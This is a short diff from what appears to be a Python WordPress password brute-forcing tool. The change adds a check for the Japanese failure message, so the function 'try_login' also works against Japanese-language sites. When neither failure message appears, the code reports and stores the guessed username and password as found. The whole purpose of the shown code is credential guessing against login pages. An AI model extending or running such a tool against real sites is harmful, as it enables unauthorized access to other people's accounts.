@@ -25,6 +25,8 @@ def try_login(url, username, password, user_agent):
         )
         if "Incorrect username or password" in res.text:
             pass
+        elif "ユーザー名またはパスワードが正しくありません" in res.text:
+            pass
         else:
             print(f"[+] Found wordpress password: {username}:{password}")
             authed[username] = password
